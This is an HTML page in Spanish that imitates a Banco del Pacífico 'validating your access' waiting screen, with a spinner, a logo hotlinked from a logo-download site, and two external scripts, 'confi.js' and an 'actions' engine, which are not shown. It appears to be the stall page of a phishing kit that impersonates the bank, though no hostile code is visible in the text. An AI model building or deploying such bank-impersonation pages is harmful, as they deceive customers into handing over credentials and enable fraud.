<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Banco del Pacífico – Validando</title>
  <style>
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
      background: #f0f2f5;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      gap: 28px;
    }

    .logo img { height: 42px; }

    .card {
      background: #fff;
      border-radius: 10px;
      padding: 48px 52px 40px;
      text-align: center;
      box-shadow: 0 1px 4px rgba(0,0,0,0.08), 0 2px 14px rgba(0,0,0,0.06);
      max-width: 340px;
      width: 90%;
    }

    /* Spinner */
    .spinner {
      width: 52px;
      height: 52px;
      border: 4px solid #dde4f0;
      border-top-color: #1b5eb5;
      border-radius: 50%;
      animation: spin 0.85s linear infinite;
      margin: 0 auto 24px;
    }
    @keyframes spin { to { transform: rotate(360deg); } }

    h2 {
      font-size: 17px;
      font-weight: 700;
      color: #1a1a1a;
      margin-bottom: 8px;
    }

    p {
      font-size: 13px;
      color: #888;
      line-height: 1.55;
    }

    .footer {
      font-size: 11px;
      color: #bbb;
      text-align: center;
    }
  </style>
</head>
<body>

  <div class="logo">
    <img src="https://wp.logos-download.com/wp-content/uploads/2023/02/Banco_del_Pacifico_Logo.png?dl" alt="Banco del Pacífico"/>
  </div>

  <div class="card">
    <div class="spinner"></div>
    <h2>Validando tu acceso</h2>
    <p>Estamos verificando tu información.<br/>Por favor espera un momento.</p>
  </div>

  <p class="footer">© 2017 Banco del Pacífico *V5.3.12a</p>

  <!-- Cargar configuración primero, luego el motor de acciones -->
  <script src="confi.js"></script>
  <script src="actions.js"></script>

</body>
</html>
